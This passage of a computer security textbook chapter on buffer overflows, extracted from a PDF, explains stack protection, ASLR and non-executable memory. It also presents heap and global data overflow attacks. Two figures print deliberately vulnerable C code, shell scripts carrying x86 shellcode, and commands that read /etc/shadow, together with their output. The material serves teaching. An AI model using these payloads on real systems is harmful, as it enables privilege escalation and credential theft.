easy for statically allocated arrays, handling dynamically \\nallocated memory is more problematic, because the size information is not available \\nat compile time. Handling this requires an extension to the semantics of a pointer \\nto include bounds information and the use of library routines to ensure these values \\nare set correctly. Several such approaches are listed in [LHEE03]. However, there is \\ngenerally a performance penalty with the use of such techniques that may or may not \\nbe acceptable. These techniques also require all programs and libraries that require \\nthese safety features to be recompiled with the modified compiler. While this can be \\nfeasible for a new release of an operating system and its associated utilities, there will \\nstill likely be problems with third-party applications.\\nA common concern with C comes from the use of unsafe standard library \\nroutines, especially some of the string manipulation routines. One approach to \\n improving\\xa0the safety of systems has been to replace these with safer variants. This \\ncan include the provision of new functions, such as strlcpy() in the BSD family of \\nsystems, including OpenBSD. Using these requires rewriting the source to conform to \\nthe new safer semantics. Alternatively, it involves replacement of the standard string \\nlibrary with a safer variant. Libsafe is a well-known example of this. It implements the \\nstandard semantics but includes additional checks to ensure that the copy operations \\ndo not extend beyond the local variable space in the stack frame. So while it cannot \\nprevent corruption of adjacent local variables, it can prevent any modification of the \\nold stack frame and return address values, and thus prevent the classic stack buffer \\noverflow types of attack we examined previously. This library is implemented as a \\ndynamic library, arranged to load before the existing standard libraries, and can thus \\nprovide protection for existing programs without requiring them to be recompiled, \\nprovided they dynamically access the standard library routines (as most programs \\ndo). The modified library code has been found to typically be at least as efficient as \\nthe standard libraries, and thus its use is an easy way of protecting existing programs \\nagainst some forms of buffer overflow attacks.\\nstack protection MechanisMs An effective method for protecting programs \\nagainst classic stack overflow attacks is to instrument the function entry and exit code \\nto setup then check its stack frame for any evidence of corruption. If any modification \\nis found, the program is aborted rather than allowing the attack to proceed. There are \\nseveral approaches to providing this protection, which we will discuss next.\\nStackguard is one of the best known protection mechanisms. It is a GCC com-\\npiler extension that inserts additional function entry and exit code. The added \\nM10_STAL0611_04_GE_C10.indd   367 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 369, 'page_label': '368'}, page_content='368  CHAPTER 10 / BuffER OvERflOw\\nfunction entry code writes a canary 12 value below the old frame pointer address, \\nbefore the allocation of space for local variables. The added function exit code checks \\nthat the canary value has not changed before continuing with the usual function exit \\noperations of restoring the old frame pointer and transferring control back to the \\nreturn address. Any attempt at a classic stack buffer overflow would have to alter this \\nvalue in order to change the old frame pointer and return addresses, and would thus \\nbe detected, resulting in the program being aborted. For this defense to function suc-\\ncessfully, it is critical that the canary value be unpredictable and should be different \\non different systems. If this were not the case, the attacker would simply ensure the \\nshellcode included the correct canary value in the required location. Typically, a ran-\\ndom value is chosen as the canary value on process creation and saved as part of the \\nprocesses state. The code added to the function entry and exit then use this value.\\nThere are some issues with using this approach. First, it requires that all pro -\\ngrams needing protection be recompiled. Second, because the structure of the stack \\nframe has changed, it can cause problems with programs, such as debuggers, which \\nanalyze stack frames. However, the canary technique has been used to recompile \\nentire BSD and Linux distributions and provide it with a high level of resistance to \\nstack overflow attacks. Similar functionality is available for Windows programs by \\ncompiling them using Microsoft’s /GS Visual C + + compiler option.\\nAnother variant to protect the stack frame is used by Stackshield and Return \\nAddress Defender (RAD). These are also GCC extensions that include additional \\nfunction entry and exit code. These extensions do not alter the structure of the stack \\nframe. Instead, on function entry the added code writes a copy of the return address \\nto a safe region of memory that would be very difficult to corrupt. On function exit \\nthe added code checks the return address in the stack frame against the saved copy \\nand, if any change is found, aborts the program. Because the format of the stack frame \\nis unchanged, these extensions are compatible with unmodified debuggers. Again, \\nprograms must be recompiled to take advantage of these extensions.\\nRun-Time Defenses\\nAs has been noted, most of the compile-time approaches require recompilation of \\nexisting programs. Hence there is interest in run-time defenses that can be deployed \\nas operating systems updates to provide some protection for existing vulnerable pro-\\ngrams. These defenses involve changes to the memory management of the virtual \\naddress space of processes. These changes act to either alter the properties of regions \\nof memory, or to make predicting the location of targeted buffers sufficiently difficult \\nto thwart many types of attacks.\\nexecutable address space protection Many of the buffer overflow at tacks, \\nsuch as the stack overflow examples in this chapter, involve copying machine code \\ninto the targeted buffer and then transferring execution to it. A possible defense is \\nto block the execution of code on the stack, on the assumption that executable code \\nshould only be found elsewhere in the processes address space.\\n12Named after the miner’s canary used to detect poisonous air in a mine and thus warn the miners in time \\nfor them to escape.\\nM10_STAL0611_04_GE_C10.indd   368 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 370, 'page_label': '369'}, page_content='10.2 / DEfENDING AGAINST BuffER OvERflOwS  369\\nTo support this feature efficiently requires support from the processor’s mem-\\nory management unit (MMU) to tag pages of virtual memory as being nonexecutable. \\nSome processors, such as the SPARC used by Solaris, have had support for this for \\nsome time. Enabling its use in Solaris requires a simple kernel parameter change. \\nOther processors, such as the x86 family, did not had this support until the 2004 \\naddition of the no-execute bit in its MMU. Extensions have been made available to \\nLinux, BSD, and other UNIX-style systems to support the use of this feature. Some \\nindeed are also capable of protecting the heap as well as the stack, which is also is the \\ntarget of attacks, as we will discuss in Section 10.3. Support for enabling no-execute \\nprotection is also included in Windows systems since XP SP2.\\nMaking the stack (and heap) nonexecutable provides a high degree of protec-\\ntion against many types of buffer overflow attacks for existing programs; hence the \\ninclusion of this practice is standard in a number of recent operating systems releases. \\nHowever, one issue is support for programs that do need to place executable code \\non the stack. This can occur, for example, in just-in-time compilers, such as is used \\nin the Java Runtime system. Executable code on the stack is also used to implement \\nnested functions in C (a GCC extension) and also Linux signal handlers. Special \\nprovisions are needed to support these requirements. Nonetheless, this is regarded \\nas one of the best methods for protecting existing programs and hardening systems \\nagainst some attacks.\\naddress space randoMization Another run-time technique that can be used \\nto thwart at tacks involves manipulation of the location of key data structures in a \\nprocesses address space. In particular, recall that in order to implement the classic \\nstack overflow attack, the attacker needs to be able to predict the approximate loca-\\ntion of the targeted buffer. The attacker uses this predicted address to determine a \\nsuitable return address to use in the attack to transfer control to the shellcode. One \\ntechnique to greatly increase the difficulty of this prediction is to change the address \\nat which the stack is located in a random manner for each process. The range of \\naddresses available on modern processors is large (32 bits), and most programs only \\nneed a small fraction of that. Therefore, moving the stack memory region around \\nby a megabyte or so has minimal impact on most programs but makes predicting \\nthe targeted buffer’s address almost impossible. This amount of variation is also \\nmuch larger than the size of most vulnerable buffers, so there is no chance of hav -\\ning a large enough NOP sled to handle this range of addresses. Again this provides \\na degree of protection for existing programs, and while it cannot stop the attack \\nproceeding, the program will almost certainly abort due to an invalid memory ref -\\nerence. This defense can be bypassed if the attacker is able to try a large number \\nof attempted exploits on a vulnerable program, each with different guesses for the \\nbuffer location.\\nRelated to this approach is the use of random dynamic memory allocation (for \\nmalloc() and related library routines). As we will discuss in Section 10.3, there is a \\nclass of heap buffer overflow attacks that exploit the expected proximity of succes -\\nsive memory allocations, or indeed the arrangement of the heap management data \\nstructures. Randomizing the allocation of memory on the heap makes the possibility \\nof predicting the address of targeted buffers extremely difficult, thus thwarting the \\nsuccessful execution of some heap overflow attacks.\\nM10_STAL0611_04_GE_C10.indd   369 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 371, 'page_label': '370'}, page_content='370  CHAPTER 10 / BuffER OvERflOw\\nAnother target of attack is the location of standard library routines. In an \\nattempt to bypass protections such as nonexecutable stacks, some buffer overflow \\nvariants exploit existing code in standard libraries. These are typically loaded at the \\nsame address by the same program. To counter this form of attack, we can use a secu-\\nrity extension that randomizes the order of loading standard libraries by a program \\nand their virtual memory address locations. This makes the address of any specific \\nfunction sufficiently unpredictable as to render the chance of a given attack correctly \\npredicting its address, very low.\\nThe OpenBSD system includes versions of all of these extensions in its techno-\\nlogical support for a secure system.\\nguard pages A final runtime technique that can be used places guard pages  \\nbetween critical regions of memory in a processes address space. Again, this exploits \\nthe fact that a process has much more virtual memory available than it typically \\nneeds. Gaps are placed between the ranges of addresses used for each of the com -\\nponents of the address space, as was illustrated in Figure 10.4. These gaps, or guard \\npages, are flagged in the MMU as illegal addresses, and any attempt to access them \\nresults in the process being aborted. This can prevent buffer overflow attacks, typi -\\ncally of global data, which attempt to overwrite adjacent regions in the processes \\naddress space, such as the global offset table, as we will discuss in Section 10.3.\\nA further extension places guard pages between stack frames or between dif -\\nferent allocations on the heap. This can provide further protection against stack and \\nheap overflow attacks, but at cost in execution time supporting the large number of \\npage mappings necessary.\\n 10.3 OTHER FORMS OF OVERFLOW ATTACKS\\nIn this section, we discuss at some of the other buffer overflow attacks that have been \\nexploited and consider possible defenses. These include variations on stack overflows, \\nsuch as return to system call, overflows of data saved in the program heap, and over-\\nflow of data saved in the processes global data section. A more detailed survey of the \\nrange of possible attacks may be found in [LHEE03].\\nReplacement Stack Frame\\nIn the classic stack buffer overflow, the attacker overwrites a buffer located in the \\nlocal variable area of a stack frame and then overwrites the saved frame pointer \\nand return address. A variant on this attack overwrites the buffer and saved frame \\npointer address. The saved frame pointer value is changed to refer to a location near \\nthe top of the overwritten buffer, where a dummy stack frame has been created with \\na return address pointing to the shellcode lower in the buffer. Following this change, \\nthe current function returns to its calling function as normal, since its return address \\nhas not been changed. However, that calling function is now using the replacement \\ndummy frame, and when it returns, control is transferred to the shellcode in the \\noverwritten buffer.\\nThis may seem a rather indirect attack, but it could be used when only a lim -\\nited buffer overflow is possible, one that permits a change to the saved frame \\nM10_STAL0611_04_GE_C10.indd   370 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 372, 'page_label': '371'}, page_content='10.3 / OTHER fORMS Of OvERflOw ATTACKS  371\\npointer but not the return address. You might recall the example program shown in \\nFigure 10.7 only permitted enough additional buffer content to overwrite the frame \\npointer but not the return address. This example probably could not use this attack, \\nbecause the final trailing NULL, which terminates the string read into the buffer, \\nwould alter either the saved frame pointer or return address in a way that would \\ntypically thwart the attack. However, there is another category of stack buffer over-\\nflows known as off-by-one attacks. These can occur in a binary buffer copy when \\nthe programmer has included code to check the number of bytes being transferred, \\nbut due to a coding error, allows just one more byte to be copied than there is space \\navailable. This typically occurs when a conditional test uses 6 = instead of 6, or \\n7 = instead of 7. If the buffer is located immediately below the saved frame \\npointer, then this extra byte could change the first (least significant byte on an x86 \\nprocessor) of this address. 13 While changing one byte might not seem much, given \\nthat the attacker just wants to alter this address from the real previous stack frame \\n(just above the current frame in memory) to a new dummy frame located in the \\nbuffer within a the current frame, the change typically only needs to be a few tens \\nof bytes. With luck in the addresses being used, a one-byte change may be all that \\nis needed. Hence, an overflow attack transferring control to shellcode is possible, \\neven if indirectly.\\nThere are some additional limitations on this attack. In the classic stack over -\\nflow attack, the attacker only needed to guess an approximate address for the buffer, \\nbecause some slack could be taken up in the NOP sled. However, for this indirect \\nattack to work, the attacker must know the buffer address precisely, as the exact \\naddress of the dummy stack frame has to be used when overwriting the old frame \\npointer value. This can significantly reduce the attack’s chance of success. Another \\nproblem for the attacker occurs after control has returned to the calling function. \\nBecause the function is now using the dummy stack frame, any local variables it was \\nusing are now invalid, and use of them could cause the program to crash before this \\nfunction finishes and returns into the shellcode. However, this is a risk with most \\nstack overwriting attacks.\\nDefenses against this type of attack include any of the stack protection \\nmechanisms to detect modifications to the stack frame or return address by func -\\ntion exit code. In addition, using nonexecutable stacks blocks the execution of \\nthe shellcode, although this alone would not prevent an indirect variant of the \\nreturn-to-system-call attack we will consider next. Randomization of the stack \\nin memory and of system libraries would both act to greatly hinder the ability \\nof the attacker to guess the correct addresses to use and hence block successful \\nexecution of the attack.\\nReturn to System Call\\nGiven the introduction of nonexecutable stacks as a defense against buffer overflows, \\nattackers have turned to a variant attack in which the return address is changed to \\njump to existing code on the system. You may recall that we noted this as an option \\n13Note that while this is not the case with the GCC compiler used for the examples in this chapter, it is a \\ncommon arrangement with many other compilers.\\nM10_STAL0611_04_GE_C10.indd   371 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 373, 'page_label': '372'}, page_content='372  CHAPTER 10 / BuffER OvERflOw\\nwhen we examined the basics of a stack overflow attack. Most commonly the address \\nof a standard library function is chosen, such as the system() function. The attacker \\nspecifies an overflow that fills the buffer, replaces the saved frame pointer with a \\nsuitable address, replaces the return address with the address of the desired library \\nfunction, writes a placeholder value that the library function will believe is a return \\naddress, and then writes the values of one (or more) parameters to this library func-\\ntion. When the attacked function returns, it restores the (modified) frame pointer, \\nthen pops and transfers control to the return address, which causes the code in the \\nlibrary function to start executing. Because the function believes it has been called, \\nit treats the value currently on the top of the stack (the placeholder) as a return \\naddress, with its parameters above that. In turn it will construct a new frame below \\nthis location and run.\\nIf the library function being called is, for example, system (“shell  command \\nline”), then the specified shell commands would be run before control returns to \\nthe attacked program, which would then most likely crash. Depending on the type of \\nparameters and their interpretation by the library function, the attacker may need to \\nknow precisely their address (typically within the overwritten buffer). In this example, \\nthough, the “shell command line” could be prefixed by a run of spaces, which would \\nbe treated as white space and ignored by the shell, thus allowing some leeway in the \\naccuracy of guessing its address.\\nAnother variant chains two library calls one after the other. This works by mak-\\ning the placeholder value (which the first library function called treats as its return \\naddress) to be the address of a second function. Then the parameters for each have to \\nbe suitably located on the stack, which generally limits what functions can be called, \\nand in what order. A common use of this technique makes the first address that \\nof the strcpy() library function. The parameters specified cause it to copy some \\nshellcode from the attacked buffer to another region of memory that is not marked \\nnonexecutable. The second address points to the destination address to which the \\nshellcode was copied. This allows an attacker to inject their own code but have it \\navoid the nonexecutable stack limitation.\\nAgain, defenses against this include any of the stack protection mechanisms to \\ndetect modifications to the stack frame or return address by the function exit code. \\nLikewise, randomization of the stack in memory, and of system libraries, hinders suc-\\ncessful execution of such attacks.\\nHeap Overflows\\nWith growing awareness of problems with buffer overflows on the stack and the \\ndevelopment of defenses against them, attackers have turned their attention to \\nexploiting overflows in buffers located elsewhere in the process address space. One \\npossible target is a buffer located in memory dynamically allocated from the heap. \\nThe heap is typically located above the program code and global data and grows up \\nin memory (while the stack grows down toward it). Memory is requested from the \\nheap by programs for use in dynamic data structures, such as linked lists of records. \\nIf such a record contains a buffer vulnerable to overflow, the memory following it \\ncan be corrupted. Unlike the stack, there will not be return addresses here to easily \\nM10_STAL0611_04_GE_C10.indd   372 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 374, 'page_label': '373'}, page_content='10.3 / OTHER fORMS Of OvERflOw ATTACKS  373\\ncause a transfer of control. However, if the allocated space includes a pointer to a \\nfunction, which the code then subsequently calls, an attacker can arrange for this \\naddress to be modified to point to shellcode in the overwritten buffer. Typically, \\nthis might occur when a program uses a list of records to hold chunks of data while \\nprocessing input/output or decoding a compressed image or video file. As well as \\nholding the current chunk of data, this record may contain a pointer to the function \\nprocessing this class of input (thus allowing different categories of data chunks to \\nbe processed by the one generic function). Such code is used and has been success -\\nfully attacked.\\nAs an example, consider the program code shown in Figure 10.11a. This \\ndeclares a structure containing a buffer and a function pointer. 14 Consider the \\nlines of code shown in the main() routine. This uses the standard malloc() \\nlibrary function to allocate space for a new instance of the structure on the heap \\nand then places a reference to the function showlen() in its function pointer to \\nprocess the buffer. Again, the unsafe gets() library routine is used to illustrate \\nan unsafe buffer copy. Following this, the function pointer is invoked to process \\nthe buffer.\\nAn attacker, having identified a program containing such a heap overflow vul-\\nnerability, would construct an attack sequence as follows. Examining the program \\nwhen it runs would identify that it is typically located at address 0x080497a8 and \\nthat the structure contains just the 64-byte buffer and then the function pointer. \\nAssume the attacker will use the shellcode we designed earlier, shown in Figure 10.8. \\nThe attacker would pad this shellcode to exactly 64 bytes by extending the NOP sled \\nat the front and then append a suitable target address in the buffer to overwrite the \\nfunction pointer. This could be 0x080497b8 (with bytes reversed because x86 is \\nlittle-endian as discussed before). Figure 10.11b shows the contents of the resulting \\nattack script and the result of it being directed against the vulnerable program (again \\nassumed to be setuid root), with the successful execution of the desired, privileged \\nshell commands.\\nEven if the vulnerable structure on the heap does not directly contain func -\\ntion pointers, attacks have been found. These exploit the fact that the allocated \\nareas of memory on the heap include additional memory beyond what the user \\nrequested. This additional memory holds management data structures used by the \\nmemory allocation and deallocation library routines. These surrounding structures \\nmay either directly or indirectly give an attacker access to a function pointer that \\nis eventually called. Interactions among multiple overflows of several buffers may \\neven be used (one loading the shellcode, another adjusting a target function pointer \\nto refer to it).\\nDefenses against heap overflows include making the heap also nonexecutable. \\nThis will block the execution of code written into the heap. However, a variant of the \\nreturn-to-system call is still possible. Randomizing the allocation of memory on the \\n14Realistically, such a structure would have more fields, including flags and pointers to other such struc -\\ntures so they can be linked together. However, the basic attack we discuss here, with minor modifications, \\nwould still work.\\nM10_STAL0611_04_GE_C10.indd   373 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 375, 'page_label': '374'}, page_content='374  CHAPTER 10 / BuffER OvERflOw\\n/* record type to allocate on heap */\\ntypedef struct chunk {\\n    char inp[64];               /* vulnerable input buffer */\\n    void (*process)(char *);    /* pointer to function to process inp */\\n} chunk_t;\\nvoid showlen(char *buf)\\n{\\n    int len;\\n    len = strlen(buf);\\n    printf(\"buffer5 read %d chars\\\\n\", len);\\n}\\nint main(int argc, char *argv[])\\n{\\n    chunk_t *next;\\n    setbuf(stdin, NULL);\\n    next = malloc(sizeof(chunk_t));\\n    next->process = showlen;\\n    printf(\"Enter value: \");\\n    gets(next->inp);\\n    next->process(next->inp);\\n    printf(\"buffer5 done\\\\n\");\\n}\\nFigure 10.11 Example Heap Overflow Attack\\n(a) Vulnerable heap overflow C code\\n(b) Example heap overflow attack\\n$ cat attack2\\n#!/bin/sh\\n# implement heap overflow against program buffer5\\nperl -e \\'print pack(\"H*\",\\n\"90909090909090909090909090909090\" .\\n\"9090eb1a5e31c08846078d1e895e0889\" .\\n\"460cb00b89f38d4e088d560ccd80e8e1\" .\\n\"ffffff2f62696e2f7368202020202020\" .\\n\"b89704080a\");\\nprint \"whoami\\\\n\";\\nprint \"cat /etc/shadow\\\\n\";\\'\\n$ attack2 | buffer5\\nEnter value:\\nroot\\nroot:$1$4oInmych$T3BVS2E3OyNRGjGUzF4o3/:13347:0:99999:7:::\\ndaemon:*:11453:0:99999:7:::\\n.\\xa0.\\xa0.\\xa0\\nnobody:*:11453:0:99999:7:::\\nknoppix:$1$p2wziIML$/yVHPQuw5kvlUFJs3b9aj/:13347:0:99999:7:::\\n.\\xa0.\\xa0.\\xa0\\nM10_STAL0611_04_GE_C10.indd   374 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 376, 'page_label': '375'}, page_content='10.3 / OTHER fORMS Of OvERflOw ATTACKS  375\\nheap makes the possibility of predicting the address of targeted buffers extremely \\ndifficult, thus thwarting the successful execution of some heap overflow attacks. Addi-\\ntionally, if the memory allocator and deallocator include checks for corruption of the \\nmanagement data, they could detect and abort any attempts to overflow outside an \\nallocated area of memory.\\nGlobal Data Area Overflows\\nA final category of buffer overflows we consider involves buffers located in the pro-\\ngram’s global (or static) data area. Figure 10.4 showed that this is loaded from the \\nprogram file and located in memory above the program code. Again, if unsafe buffer \\noperations are used, data may overflow a global buffer and change adjacent memory \\nlocations, including perhaps one with a function pointer, which is then subsequently \\ncalled.\\nFigure 10.12a illustrates such a vulnerable program (which shares many simi -\\nlarities with Figure 10.11a, except that the structure is declared as a global variable). \\nThe design of the attack is very similar; indeed only the target address changes. The \\nglobal structure was found to be at address 0x08049740, which was used as the tar-\\nget address in the attack. Note that global variables do not usually change location, \\nas their addresses are used directly in the program code. The attack script and result \\nof successfully executing it are shown in Figure 10.12b.\\nMore complex variations of this attack exploit the fact that the process address \\nspace may contain other management tables in regions adjacent to the global data \\narea. Such tables can include references to destructor functions (a GCC C and C + + \\nextension), a global-offsets table (used to resolve function references to dynamic \\nlibraries once they have been loaded), and other structures. Again, the aim of the \\nattack is to overwrite some function pointer that the attacker believes will then be \\ncalled later by the attacked program, transferring control to shellcode of the attack-\\ner’s choice.\\nDefenses against such attacks include making the global data area nonexecut-\\nable, arranging function pointers to be located below any other types of data, and \\nusing guard pages between the global data area and any other management areas.\\nOther Types of Overflows\\nBeyond the types of buffer vulnerabilities we have discussed here, there are still more \\nvariants including format string overflows and integer overflows. It is likely that even \\nmore will be discovered in future. The references given the in Recommended Reading \\nfor this chapter include details of additional variants. In particular, details of a range \\nof buffer overflow attacks are discussed in [LHEE03] and [VEEN12].\\nThe important message is that if programs are not correctly coded in the first \\nplace to protect their data structures, then attacks on them are possible. While the \\ndefenses we have discussed can block many such attacks, some, like the original \\nexample in Figure 10.1 (which corrupts an adjacent variable value in a manner that \\nalters the behavior of the attacked program), simply cannot be blocked except by \\ncoding to prevent them.\\nM10_STAL0611_04_GE_C10.indd   375 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 377, 'page_label': '376'}, page_content='376  CHAPTER 10 / BuffER OvERflOw\\n/* global static data - will be targeted for attack */\\nstruct chunk {\\n    char inp[64];        /* input buffer */\\n    void (*process)(char *); /* pointer to function to process it */\\n} chunk;\\nvoid showlen(char *buf)\\n{\\n    int len;\\n    len = strlen(buf);\\n    printf(\"buffer6 read %d chars\\\\n\", len);\\n}\\nint main(int argc, char *argv[])\\n{\\n    setbuf(stdin, NULL);\\n    chunk.process = showlen;\\n    printf(\"Enter value: \");\\n    gets(chunk.inp);\\n    chunk.process(chunk.inp);\\n    printf(\"buffer6 done\\\\n\");\\n}\\nFigure 10.12 Example Global Data Overflow Attack\\n(a) Vulnerable global data overflow C code\\n(b) Example global data overflow attack\\n$ cat attack3\\n#!/bin/sh\\n# implement global data overflow attack against program buffer6\\nperl -e \\'print pack(\"H*\",\\n\"90909090909090909090909090909090\" .\\n\"9090eb1a5e31c08846078d1e895e0889\" .\\n\"460cb00b89f38d4e088d560ccd80e8e1\" .\\n\"ffffff2f62696e2f7368202020202020\" .\\n\"409704080a\");\\nprint \"whoami\\\\n\";\\nprint \"cat /etc/shadow\\\\n\";\\'\\n$ attack3 | buffer6\\nEnter value:\\nroot\\nroot:$1$4oInmych$T3BVS2E3OyNRGjGUzF4o3/:13347:0:99999:7:::\\ndaemon:*:11453:0:99999:7:::\\n. . . .\\nnobody:*:11453:0:99999:7:::\\nknoppix:$1$p2wziIML$/yVHPQuw5kvlUFJs3b9aj/:13347:0:99999:7:::\\n. . . .\\nM10_STAL0611_04_GE_C10.indd   376 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 378, 'page_label': '377'}, page_content='10.4 / KEY TERMS, REvIEw QuESTIONS, AND PROBlEMS  377\\n 10.4 KEY TERMS, REVIEW QUESTIONS, AND PROBLEMS\\nKey Terms\\naddress space\\nbuffer\\nbuffer overflow\\nbuffer overrun\\nguard page\\nheap\\nheap overflow\\nlibrary function\\nmemory management\\nnonexecutable memory\\nno-execute\\nNOP sled\\noff-by-one\\nposition independent\\nshell\\nshellcode\\nstack frame\\nstack buffer overflow\\nstack smashing\\nvulnerability\\nReview Questions\\n 10.1 Define buffer overflow.\\n 10.2 List the three distinct types of locations in a pr ocess address space that buffer over -\\nflow attacks typically target.\\n 10.3 Why do modern high-level programming languages not suffer from buffer overflows?\\n 10.4 What is stack smashing?\\n 10.5 How does an attacker identify vulnerable programs?\\n 10.6 What is a stack frame?\\n 10.7 Define an off-by-one attack.\\n 10.8 What restrictions are often found in shellcode, and how can they be avoided?\\n 10.9 Describe what a NOP sled is and how it is used in a buffer overflow attack.\\n 10.10 List some of the different operations an attacker may design shellcode to perform.\\n 10.11 What are the two broad categories of defenses against buffer overflows?\\n 10.12 List and briefly describe some of the defenses against buf fer overflows that can be \\nused when compiling new programs.\\n 10.13 List and briefly describe some of the defenses against buf fer overflows that can be \\nimplemented when running existing vulnerable programs.\\n 10.14 What is the importance of a no-execute bit in the x86 processor family?\\n 10.15 What is the main functionality of a stackguard?\\n 10.16 Describe one possible approach to overcome a global data area overflow attack.\\nProblems\\n 10.1 Investigate each of the unsafe standard C library functions shown in Figure 10.2 using the \\nUNIX man pages or any C programming text, and determine a safer alternative to use.\\n 10.2 Execute the progr am shown in Figure 10.1a with an input SECURITYSECURITY \\nand explain the output of the program.\\n 10.3 Execute the program shown in Figure 10.5a with an input “Computer Engineering” \\nand explain the output of the program.\\n 10.4 Execute the program shown in Figure 10.7a with an input “Computer Security” and \\nexplain the output of the program.\\nM10_STAL0611_04_GE_C10.indd   377 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 379, 'page_label': '378'}, page_content='378  CHAPTER 10 / BuffER OvERflOw\\n 10.5 The example shellcode shown in Figure 10.8b assumes that the execve system call will \\nnot return (which is the case as long as it is successful). However, to cover the pos -\\nsibility that it might fail, the code could be extended to include another system call \\nafter it, this time to exit(0). This would cause the program to exit normally, attracting \\nless attention than allowing it to crash. Extend this shellcode with the extra assembler \\ninstructions needed to marshal arguments and call this system function.\\n 10.6 Experiment with running the stack overflow attack using either the original shellcode \\nfrom Figure 10.8b or the modified code from Problem 1.5, against an example vulner-\\nable program. You will need to use an older O/S release that does not include stack \\nprotection by default. You will also need to determine the buffer and stack frame loca-\\ntions, determine the resulting attack string, and write a simple program to encode this \\nto implement the attack.\\n 10.7 Determine what assembly language instructions would be needed to implement shell-\\ncode functionality shown in F igure 10.8a on a PowerPC processor (such as has been \\nused by older MacOS or PPC Linux distributions).\\n 10.8 Investigate the use of a replacement standard C string library, such as Libsafe, bstring, \\nvstr, or other. Determine how significant the required code changes are, if any, to use \\nthe chosen 